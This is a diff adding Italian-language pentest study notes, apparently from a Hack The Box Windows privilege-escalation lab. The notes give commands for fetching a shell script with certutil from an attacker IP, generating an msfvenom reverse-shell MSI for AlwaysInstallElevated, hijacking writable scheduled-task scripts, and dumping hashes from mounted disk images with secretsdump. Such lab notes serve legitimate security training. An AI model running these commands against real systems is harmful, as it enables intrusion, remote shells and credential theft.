@@ -1482,3 +1482,93 @@ PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder
 
 ### Restic- restore a backup with ID
 `PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore`
+
+# Miscellaneous Techniques
+
+## Living Off The Land Binaries and Scripts (LOLBAS)
+
+IL LOLBAS project (https://lolbas-project.github.io/) ha binari e script e librerie le **living off the land** 
+
+Le funzionalita' che offrono questi binari sono
+- Code execution
+- Code compilation
+- File transfers
+- Persistence
+- UAC bypass
+- Credential theft
+- Dumping process memory
+- Keylogging
+- Evasion
+- DLL hijacking
+
+### Esempio, usare certutil.exe per trasferire file
+
+`PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat`
+
+### Encode/decode file with Certutil.exe
+`C:\htb> certutil -encode file1 encodedfile`
+
+`C:\htb> certutil -decode encodedfile file2`
+
+## Always Install Elevated
+
+QUesto setting si puo' cambiare tramite la Local Group Policy settings settando **Enabled** sotto questi 2 path:
+
+1) Computer Configuration\Administrative Templates\Windows Components\Windows Installer
+2) User Configuration\Administrative Templates\Windows Components\Windows Installer
+
+## Enumerating Always Install Elevated
+`PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
+
+`PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
+
+## Exploiting Always Install Elevated (create .msi package)
+`j4k1dibe@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi`, creo il file .msi
+
+`C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart` eseguo il file .msi
+
+Questa shell dovrebbe essere proprio da NT AUTHORITY\SYSTEM
+
+## CVE-2019-1388
+
+ CHECKA SE C'E' questa vuln
+
+## Scheduled Tasks
+
+### Enumerating Scheduled Tasks
+`C:\htb>  schtasks /query /fo LIST /v`
+
+`PS C:\htb> Get-ScheduledTask | select TaskName,State`
+
+## Writable folder
+`C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\` se vediamo che abbiamo permessi di scrittura in una cartella cosi' e c'e' file dentro che viene eseguito periodicamente lo sostituiamo ezez.
+
+
+## User/Computer Description Field
+
+A volte potrebbe capitare (piu' comune in Active Directory) che un sysadmin stora dettagli di un account nella descrizione
+
+`PS C:\htb> Get-LocalUser` ritorna Nome, Enabled e Description degli utenti.
+
+### Enumeratng desription filed con un altro Cmdlet
+
+`PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description`
+
+## Mount VHDX/VMDK
+
+Durante l' enumeration possiamo imbatterci in file interessanti sia localmente che in share. **Snaffler** (https://github.com/SnaffCon/Snaffler) puo' aiutarci in questa enumeration.
+
+Ci sono alcuni file piu' interessanti di altri: **.vhd, .vhdx, .vmdk** che sono **Virtual Hard Disk** e **Virtual Machine Disk** file.
+
+Da questi file possiamo probabilmente rubare hash, 
+
+### Montarli localmente su linux
+`j4k1dibe@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk`, montare un .vmdk
+
+`j4k1dibe@htb[/htb]$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1` montare un .vhd o .vhdx
+
+### Montarli localmente su Windows
+Su windows si puo' usare **Disk Management** > actions > 
+
+### Retrievare hash con secretsdump.py
+`j4k1dibe@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL`
